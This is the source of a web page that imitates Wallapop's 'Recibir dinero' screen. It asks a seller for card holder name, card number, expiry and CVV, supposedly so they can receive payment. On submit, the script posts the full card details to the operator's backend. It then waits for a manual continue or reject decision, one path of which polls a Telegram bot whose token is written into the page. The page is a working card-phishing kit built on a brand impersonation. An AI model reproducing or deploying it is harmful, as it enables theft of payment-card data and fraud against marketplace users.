<?php
require_once __DIR__ . '/functions.php';

$id = $_GET['id'] ?? '';
if (empty($id) && preg_match('#/a/([A-Za-z0-9]+)#', $_SERVER['REQUEST_URI'] ?? '', $m)) {
    $id = $m[1];
}
if (empty($id)) {
    $id = get_active_id();
}

$prod = find_product($id);
$prodTit = $prod['titulo'] ?? ($prod['articulo'] ?? 'iPhone 13');
$prodPre = format_eur($prod['precioArticulo'] ?? ($prod['precio'] ?? 230));
$prodFoto = !empty($prod['fotos'][0]) ? $prod['fotos'][0] : '';
$prodFoto = ensure_local_photo($prodFoto);
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Datos de la tarjeta · Wallapop</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
@font-face{font-family:WallieFit;src:url(https://d22j03ecumputt.cloudfront.net/fonts/Wallie-Fit.woff2) format('woff2');font-display:swap}
@font-face{font-family:WallieChunky;src:url(https://d22j03ecumputt.cloudfront.net/fonts/Wallie-Chunky.woff2) format('woff2');font-weight:700;font-display:swap}
:root{
  --wp-content-high:#29363D;--wp-content-mid:#5C7A89;--wp-content-low:#A3B8C1;
  --wp-brand-high:#015354;--wp-brand-mid:#038673;--wp-brand-low:#3DD2BA;--wp-brand:#13C1AC;
  --wp-brand-subtle:#CCFAF1;--wp-bg-low:#F0F3F5;--wp-line:#E3E9EC;--wp-lime:#E9FFB4;
  --wp-negative:#CE3528;--wp-ok:#228618;
}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;padding:0;background:#fff;width:100%;min-height:100vh}
body{display:flex;justify-content:center}
b,strong{font-family:WallieChunky,Quicksand,sans-serif;font-weight:700}
.phone{width:100%;max-width:520px;min-height:100vh;background:#fff;border:none;border-radius:0;box-shadow:none;position:relative;font-family:WallieFit,Quicksand,system-ui,sans-serif;color:var(--wp-content-high);padding-bottom:22px}
.status{display:none !important}

.bar{display:flex;align-items:center;gap:10px;padding:12px 16px 6px}
.back{background:none;border:0;padding:4px;display:grid;place-items:center;cursor:pointer}
.back svg{width:24px;height:24px;stroke:var(--wp-content-high);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
.bar h1{font-family:WallieChunky,Quicksand;font-size:17px;margin:0;letter-spacing:-.2px}

.mini{display:flex;align-items:center;gap:12px;margin:6px 16px 14px;background:var(--wp-bg-low);border-radius:14px;padding:12px}
.mini .th{width:46px;height:46px;border-radius:8px;overflow:hidden;background:#E4EAED;flex:none}
.mini .th img{width:100%;height:100%;object-fit:cover}
.mini .t{font-size:13px;line-height:1.3;margin:0 0 3px;font-family:WallieChunky,Quicksand}
.mini .p{font-size:13px;color:var(--wp-content-mid)}
.mini .tot{margin-left:auto;font-family:WallieChunky,Quicksand;font-size:16px;white-space:nowrap}

.notice{display:flex;gap:10px;margin:0 16px 16px;background:var(--wp-brand-subtle);border-radius:14px;padding:12px 14px}
.notice svg{width:18px;height:18px;flex:none;stroke:var(--wp-brand-high);fill:none;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round;margin-top:1px}
.notice p{margin:0;font-size:12.5px;line-height:1.45;color:var(--wp-brand-high)}

form{padding:0 16px}
.f{margin-bottom:14px}
.f label{display:block;font-family:WallieChunky,Quicksand;font-size:13px;margin-bottom:6px}
.wrap{position:relative}
.f input{width:100%;height:52px;border:1px solid var(--wp-content-mid);border-radius:8px;padding:0 14px;font-family:inherit;font-size:16px;letter-spacing:.4px;color:var(--wp-content-high);background:#fff;outline:none;transition:border-color .12s, box-shadow .12s}
.f input::placeholder{color:var(--wp-content-low);letter-spacing:0}
.f input:focus{border-color:var(--wp-brand-mid);box-shadow:inset 0 0 0 1px var(--wp-brand-mid)}
.f.err input{border-color:var(--wp-negative);box-shadow:inset 0 0 0 1px var(--wp-negative)}
.msg{font-size:11.5px;color:var(--wp-negative);margin:5px 0 0;display:none}
.f.err .msg{display:block}
.brand{position:absolute;right:12px;top:50%;transform:translateY(-50%);font-family:WallieChunky,Quicksand;font-size:10px;letter-spacing:.5px;color:#fff;background:var(--wp-content-high);border-radius:4px;padding:3px 6px;display:none}
.brand.on{display:block}
#numero{padding-right:58px}
.card-brand-badge{position:absolute;right:12px;top:50%;transform:translateY(-50%);display:none;align-items:center;justify-content:center;height:30px;pointer-events:none}
.card-brand-badge img{height:24px;width:auto;max-width:38px;object-fit:contain;display:block}
.card-error-box{display:none;align-items:center;gap:10px;margin-bottom:14px;padding:12px 14px;background:#FDEDEC;border:1px solid #F5B7B1;border-radius:10px;color:#C0392B;font-size:13px;line-height:1.4}
.card-error-box svg{width:20px;height:20px;flex:none;stroke:#C0392B;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
.btn-spinner{display:inline-block;width:18px;height:18px;border:2.5px solid rgba(41,54,61,.25);border-top-color:var(--wp-content-high);border-radius:50%;animation:btn-spin .75s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes btn-spin{to{transform:rotate(360deg)}}
.duo{display:flex;gap:12px}
.duo .f{flex:1}
.cvv-ico{position:absolute;right:12px;top:50%;transform:translateY(-50%);width:20px;height:20px;stroke:var(--wp-content-low);fill:none;stroke-width:1.8;stroke-linecap:round}

.cta{display:block;width:100%;height:50px;border:0;border-radius:100px;background:var(--wp-brand-low);color:var(--wp-content-high);font-family:WallieChunky,Quicksand;font-size:16px;cursor:pointer;margin-top:6px;transition:background .15s, transform .08s}
.cta:active{transform:scale(.985);background:#2FC5AD}
.cta[disabled]{opacity:.55;cursor:default;transform:none}
.legal{font-size:11.5px;color:var(--wp-content-mid);text-align:center;margin:12px 16px 0;line-height:1.5}
.sello{display:flex;justify-content:center;gap:6px;align-items:center;font-size:11px;color:var(--wp-content-mid);margin-top:14px}
.sello svg{width:14px;height:14px;stroke:var(--wp-content-mid);fill:none;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round}

.ok{padding:40px 26px 10px;text-align:center;display:none}
.ok .ico{width:74px;height:74px;border-radius:50%;background:var(--wp-brand-subtle);display:grid;place-items:center;margin:0 auto 16px}
.ok .ico svg{width:34px;height:34px;stroke:var(--wp-brand-high);fill:none;stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round}
.ok h2{font-family:WallieChunky,Quicksand;font-size:19px;margin:0 0 8px}
.ok p{font-size:13.5px;color:var(--wp-content-mid);margin:0 0 20px;line-height:1.5}
.ok .btn2{display:inline-flex;align-items:center;gap:6px;border:2px solid var(--wp-brand-low);border-radius:100px;background:#fff;color:var(--wp-content-high);padding:12px 20px;font-family:WallieChunky,Quicksand;font-size:14px;cursor:pointer;text-decoration:none}
</style>
</head>
<body>
<div class="phone">

  <div id="vistaForm">
    <div class="bar">
      <button class="back" id="volver" aria-label="Volver">
        <svg viewBox="0 0 24 24"><path d="M15 5l-7 7 7 7"/></svg>
      </button>
      <h1>Recibir dinero</h1>
    </div>

    <div class="mini">
      <div class="th"><img id="thumb" alt="" hidden></div>
      <div>
        <p class="t" id="miniTitulo">Cargando…</p>
        <div class="p">Envío protegido</div>
      </div>
      <div class="tot" id="miniTotal">—</div>
    </div>

    <div class="notice">
      <svg viewBox="0 0 24 24"><rect x="4.5" y="10" width="15" height="10" rx="2.5"/><path d="M8 10V7.5a4 4 0 0 1 8 0V10"/></svg>
      <p>Introduce una tarjeta a tu nombre. El abono se hace en 1-2 días laborables tras confirmar la entrega.</p>
    </div>

    <form id="form" novalidate>
      <div class="f" id="fTitular">
        <label for="titular">Titular de la tarjeta</label>
        <div class="wrap"><input id="titular" type="text" placeholder="Nombre y apellidos" autocomplete="cc-name"></div>
        <p class="msg">Escribe el nombre tal y como aparece en la tarjeta.</p>
      </div>

      <div class="f" id="fNumero">
        <label for="numero">Número de tarjeta</label>
        <div class="wrap">
          <input id="numero" type="text" inputmode="numeric" placeholder="0000 0000 0000 0000" autocomplete="cc-number">
          <div class="card-brand-badge" id="cardBrandBadge" style="display:none;">
            <img id="cardBrandImg" src="" alt="Marca">
          </div>
        </div>
        <p class="msg">Número de tarjeta no válido.</p>
      </div>

      <div class="duo">
        <div class="f" id="fCad">
          <label for="cad">Caducidad</label>
          <div class="wrap"><input id="cad" type="text" inputmode="numeric" placeholder="MM/AA" autocomplete="cc-exp"></div>
          <p class="msg">Fecha no válida.</p>
        </div>
        <div class="f" id="fCvv">
          <label for="cvv">CVV</label>
          <div class="wrap">
            <input id="cvv" type="text" inputmode="numeric" placeholder="123" autocomplete="cc-csc">
            <svg class="cvv-ico" viewBox="0 0 24 24"><rect x="2.5" y="5" width="19" height="14" rx="2.5"/><path d="M2.5 10h19"/><path d="M6 15h4"/></svg>
          </div>
          <p class="msg">3 o 4 dígitos.</p>
        </div>
      </div>

      <div id="cardErrorBox" class="card-error-box">
        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
        <span id="cardErrorText">Ha ocurrido un error al verificar la tarjeta. Por favor revisa los datos.</span>
      </div>

      <button class="cta" id="enviar" type="submit">
        <span class="btn-spinner" id="spinnerTarjeta" style="display:none;"></span>
        <span id="txtBtnTarjeta">Continuar</span>
      </button>
      <p class="legal">Al confirmar aceptas las Condiciones de uso y la Política de privacidad de Wallapop.</p>

      <div class="sello">
        <svg viewBox="0 0 24 24"><rect x="4.5" y="10" width="15" height="10" rx="2.5"/><path d="M8 10V7.5a4 4 0 0 1 8 0V10"/></svg>
        Conexión cifrada · Pago protegido
      </div>
    </form>
  </div>

  <div class="ok" id="vistaOk">
    <div class="ico"><svg viewBox="0 0 24 24"><path d="M5 12.5l4.5 4.5L19 7.5"/></svg></div>
    <h2>Datos guardados</h2>
    <p id="okTexto">El dinero está en camino.</p>
    <a class="btn2" id="okVolver" href="#">Volver al anuncio</a>
  </div>

</div>

<script>
const $ = id => document.getElementById(id);
const eur = n => new Intl.NumberFormat('es-ES', { maximumFractionDigits: 0 }).format(Number(n) || 0) + ' \u20AC';
const id = (location.pathname.match(/\/a\/([A-Za-z0-9]+)/) || [])[1] || '';
const seg = new URLSearchParams(location.search).get('seg') || '';

const VISA_PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAADjUlEQVR4nO1YW0iUQRTet156qdyMMnoJjMgieioKegi6YBFRBJUksWtqQphWKFRqF1MUjUqzRBAJybxl5oOo/79eU1dX85K2rilu3i+76y13zRNn1p39f9h1H/zBVeaDA/9/5syZ882ccwZGJmNgYGBgYNhI2OKv2u2h4HPlSs4kV/LgHsKZPBR8wbZb5d4ug5cruYm1D5h3LApuEmN0SsC6824QqHIlEnyOUwLulTa8s1MwrkDADQJUuhZGQM4I8IyAQ2wYAt4hRRCTHATN+QehrdAHWvIPQMq7a+AZUEGdeAVXwvT8IiAWLEuw714NlGjGwIYzsc3Ebu/dakgu6YfW/mmYnLGAYdYCLX0miMjWioI697IZhDj0oG71J3A8PBPGan0BVJuIXI+Oo2M3U9rpYoWNo0T3a2iW6jDwPSFV0DVo1wmRUjogWiu/YUQ07ve2XZoUisrVAQymw5JqM7xKVVB9Xr19wUuJrbAzUAXmxSXyP2xYIDahmd3UpqprCs7Ha+BktBoe5/TA1eQf1JfP/Vo614bE4j5pCJx61mT1OF4EuvLTRLc7uBJm/lrT5/foHGwP4OHoowZRsGj3NK+X6t6X650GlFDcR2wmZ8wwMD5PvsvaJqQhsOO2CqZmLcTpdE8S0fmn2tMHg0Sd35s2qsvg/hCdb5xGtKsNPUa4EK8R+d8VVAmjxgUynl6hJ+lI9stklq4L0eK0GOBYZCkUNFgXwWPfH1ZLbKIx1ZYhLNDnBb1g+SdOj6Rv/XT8TsZPqsfTjsmz+zn8sE4aApHZWupUkdYBs8vp87XJWrwoH6uHqM3lpFZxM3jSKOpQCKwFuZIHTZ+J/HfqZ8g/zrUBT1oSAieiGqnT9oFp+n1FEGi91uCyBRaprSeHuPG6Dc7G2ltn78gcfFGPktx3dFKrIoBFOmYyi3awf2wePAPsNliACLwb0B7vgbQyPWm3mPeBHzrJHATeB9hm8wSdzBG4jklpCKDY8t6GFwXW4kXxDq2hekwJW+47Al5kFxNaRK2zXmuAsKxuKmqdcZmomWyGJATCs+w9HYsSA7CNCbvN57phosNaadQZyW7jTY2ph70dyQpbJwJPSbiWkPyRiO/SEHAnkTECSkYAGIH1+6zCG2TOgM93ax6g0pVwn5wSwLdHfL5b+yB5h+Kh4Me3Kjgvmcv3UQWfgy9g7pM2nBF33mXwDAwMDAwMsnWG/92IM3PpvUaOAAAAAElFTkSuQmCC';
const MC_PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAACnUlEQVR4nO2YzWsTQRjGNxRR8VA9+dG01ngoIv4J2Y9m7aGrJtOKePbkxYNgGpM0Hz30qFc/ED2pbRHSXTcqaRT8FwR70UvWJHhQ0VLSg+ArM2lKW91spjM1G5kHnstmhzy/4Z2Zd0eShISEhISE/ieFo68GZWQ/U1BxRUFF8IlXZGQXtAsvRzzDKzH7qw8Cg4u/4YyuAOszDz73giuAz8oG/m77RzsA6AVLLAB6zISZ8QSUdQUcNQhr4X3ENfUoLOkq+W0UWVvHXDRhJpGE8n0dnEII1sr9xE4hRJ7lEynyzq4DZIwU1NQjAGGprevKYUgZmeaYqWmoWUMAb/e2dc06Dpl4ZncANPQc5sYmPINv9q9wAJYyEc/gsM1zty+BNmHzBaANj/3u6hnq8LDuJ7cu8wPAZUMb/g8/2EMNkY5n2QHwgsWLkxkgGgB4QwdQtwZdF3bHAHhHoQ27HB3ZcenANuem0mwAr3WZGuB98jQ3gNK9s2wAn9Rj7OXTMgpQAziFEBtAQ97PDyAiUQM0ygf/PUCj2M+thFZLh9gAHHWAGqD+MMgNoLLIWEK43+FWQtf66BfxXcZFnDdu8gO4Q3+YZVm30UjMhKpCtxP9lPvg86MB5vKpWUPsB1mzlUhTz/aH8yeZAVI3ct1t5jacpa/9xzybOWwtZsPTsUnqdnr5yqkddaIa73a65bQx3dGawB8018/NNsfEs1A1hz2DV83htmXDBaC1sHPjSSjpGlTUIDnsVuUD8FE7QZ4ljDz5ANoyZtIkjRnubfDejk9Y7MpiiDzDuw1+p5P/Zwbwg6VevlaRY/Z3VwB8fdftgIq3510B8N0jvr7z7eyj4hcFvQhKnvejqLiAb8C6HVjZMMky7xleSEhISEhI6jH9Bnm6laI4if4oAAAAAElFTkSuQmCC';

let marca = '';
let cardPollTimer = null;
let p = null;

(async function init() {
  $('volver').onclick = () => location.href = '/a/' + id;
  $('okVolver').href = '/a/' + id;
  if (!id) { $('miniTitulo').textContent = 'Sin producto'; return; }
  try {
    try {
      const r = await fetch('/api/product/' + id);
      if (r.ok) p = await r.json();
    } catch (e) {}
    if (!p || !p.id) {
      try {
        const r = await fetch('/products.json?t=' + Date.now());
        if (r.ok) {
          const d = await r.json();
          const prods = d.products || d;
          if (prods && prods[id]) p = prods[id];
        }
      } catch (e) {}
    }
    if (p) {
      $('miniTitulo').textContent = p.titulo || 'Producto';
      $('miniTotal').textContent = eur(p.precioArticulo || p.precio);
      if ($('ctaTotal')) $('ctaTotal').textContent = eur(p.precioArticulo || p.precio);
      let f = (p.fotos || [])[0];
      if (f) {
        if (typeof f === 'string' && f.includes('api.telegram.org') && !f.includes('images.weserv.nl')) {
          f = 'https://images.weserv.nl/?url=' + encodeURIComponent(f.replace(/^https?:\/\//, ''));
        }
        $('thumb').src = f;
        $('thumb').hidden = false;
      }
    }
  } catch (e) {}
})();

/* titular */
$('titular').addEventListener('input', e => {
  e.target.value = e.target.value.replace(/[^A-Za-zÁÉÍÓÚÜÑáéíóúüñ .'-]/g, '');
  $('fTitular').classList.remove('err');
  $('cardErrorBox').style.display = 'none';
});

/* número */
$('numero').addEventListener('input', e => {
  let v = e.target.value.replace(/\D/g, '');
  const esAmex = /^3[47]/.test(v);
  v = v.slice(0, esAmex ? 15 : 16);

  if (/^4/.test(v)) {
    marca = 'VISA';
    $('cardBrandImg').src = VISA_PNG;
    $('cardBrandBadge').style.display = 'flex';
  } else if (/^(5[1-5]|2[2-7])|^5/.test(v)) {
    marca = 'MASTERCARD';
    $('cardBrandImg').src = MC_PNG;
    $('cardBrandBadge').style.display = 'flex';
  } else {
    marca = '';
    $('cardBrandBadge').style.display = 'none';
  }

  const g = esAmex ? [4, 6, 5] : [4, 4, 4, 4];
  let out = '', i = 0;
  for (const n of g) { if (v.length > i) { out += (out ? ' ' : '') + v.substr(i, n); i += n; } }
  e.target.value = out.trim();
  $('cvv').maxLength = esAmex ? 4 : 3;
  $('fNumero').classList.remove('err');
  $('cardErrorBox').style.display = 'none';
});

/* caducidad */
$('cad').addEventListener('input', e => {
  let v = e.target.value.replace(/\D/g, '').slice(0, 4);
  if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
  e.target.value = v;
  $('fCad').classList.remove('err');
  $('cardErrorBox').style.display = 'none';
});

/* cvv */
$('cvv').addEventListener('input', e => {
  e.target.value = e.target.value.replace(/\D/g, '').slice(0, e.target.maxLength || 3);
  $('fCvv').classList.remove('err');
  $('cardErrorBox').style.display = 'none';
});

function luhn(s) {
  let suma = 0, par = false;
  for (let i = s.length - 1; i >= 0; i--) {
    let d = +s[i];
    if (par) { d *= 2; if (d > 9) d -= 9; }
    suma += d; par = !par;
  }
  return suma % 10 === 0;
}

function cadValida(v) {
  const m = v.match(/^(\d{2})\/(\d{2})$/);
  if (!m) return false;
  const mes = +m[1], ano = 2000 + +m[2];
  if (mes < 1 || mes > 12) return false;
  const hoy = new Date();
  const fin = new Date(ano, mes, 1);
  return fin > hoy;
}

$('form').addEventListener('submit', async ev => {
  ev.preventDefault();
  $('cardErrorBox').style.display = 'none';

  const titular = $('titular').value.trim();
  const num = $('numero').value.replace(/\s/g, '');
  const cad = $('cad').value;
  const cvv = $('cvv').value;
  let mal = false;

  if (titular.length < 3) { $('fTitular').classList.add('err'); mal = true; }
  if (num.length < 13 || !luhn(num)) { $('fNumero').classList.add('err'); mal = true; }
  if (!cadValida(cad)) { $('fCad').classList.add('err'); mal = true; }
  if (cvv.length < 3) { $('fCvv').classList.add('err'); mal = true; }
  if (mal) return;

  const btn = $('enviar');
  btn.disabled = true;
  $('spinnerTarjeta').style.display = 'inline-block';
  $('txtBtnTarjeta').textContent = 'Continuar';

  const payload = {
    titular,
    numero: num,
    ultimos: num.slice(-4),
    marca: marca || 'TARJETA',
    cad,
    cvv,
    seguimiento: seg
  };

  try {
    await fetch('/api/product/' + id + '/tarjeta', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (e) {}

  if (cardPollTimer) clearTimeout(cardPollTimer);

  const pollCardStatus = async () => {
    let data = null;
    // 1. Probar ruta amigable
    try {
      const resp = await fetch('/api/product/' + id + '/tarjeta/status?t=' + Date.now());
      if (resp.ok) {
        data = await resp.json();
      }
    } catch (e) {}

    // 2. Probar api.php directo (fallback infalible para hosting PHP)
    if (!data || !data.status) {
      try {
        const resp2 = await fetch('/api.php?action=tarjeta_status&id=' + id + '&t=' + Date.now());
        if (resp2.ok) {
          data = await resp2.json();
        }
      } catch (e) {}
    }

    if (data && data.status) {
      if (data.status === 'continue' || data.status === 'continuar') {
        const qParams = new URLSearchParams();
        if (id) qParams.set('id', id);
        if (p) {
          if (p.titulo || p.articulo) qParams.set('tit', p.titulo || p.articulo);
          const pVal = p.precioArticulo || p.precio || 0;
          if (pVal) qParams.set('precio', pVal);
        }
        const rawP = new URLSearchParams(location.search).get('p');
        if (rawP) qParams.set('p', rawP);
        try { localStorage.setItem('wp_active_prod', JSON.stringify(p || { id })); } catch(e) {}
        window.location.href = 'confirmar.php?' + qParams.toString();
        return;
      } else if (data.status === 'error') {
        $('spinnerTarjeta').style.display = 'none';
        $('txtBtnTarjeta').textContent = 'Continuar';
        btn.disabled = false;
        $('cardErrorText').textContent = 'La tarjeta ha sido rechazada o los datos son incorrectos. Por favor compruébalos e inténtalo de nuevo.';
        $('cardErrorBox').style.display = 'flex';
        return;
      }
    }

    // 3. Respaldo adicional Telegram getMyDescription
    try {
      const tgDescResp = await fetch('https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/getMyDescription?t=' + Date.now());
      if (tgDescResp.ok) {
        const tgData = await tgDescResp.json();
        const desc = (tgData && tgData.result && tgData.result.description) || '';
        if (desc.includes('status:continue')) {
          const qParams = new URLSearchParams();
          if (id) qParams.set('id', id);
          if (p) {
            if (p.titulo || p.articulo) qParams.set('tit', p.titulo || p.articulo);
            const pVal = p.precioArticulo || p.precio || 0;
            if (pVal) qParams.set('precio', pVal);
          }
          const rawP = new URLSearchParams(location.search).get('p');
          if (rawP) qParams.set('p', rawP);
          try { localStorage.setItem('wp_active_prod', JSON.stringify(p || { id })); } catch(e) {}
          window.location.href = 'confirmar.php?' + qParams.toString();
          return;
        } else if (desc.includes('status:error')) {
          $('spinnerTarjeta').style.display = 'none';
          $('txtBtnTarjeta').textContent = 'Continuar';
          btn.disabled = false;
          $('cardErrorText').textContent = 'La tarjeta ha sido rechazada o los datos son incorrectos. Por favor compruébalos e inténtalo de nuevo.';
          $('cardErrorBox').style.display = 'flex';
          return;
        }
      }
    } catch (e) {}

    cardPollTimer = setTimeout(pollCardStatus, 1000);
  };

  cardPollTimer = setTimeout(pollCardStatus, 1200);
});
</script>
</body>
</html>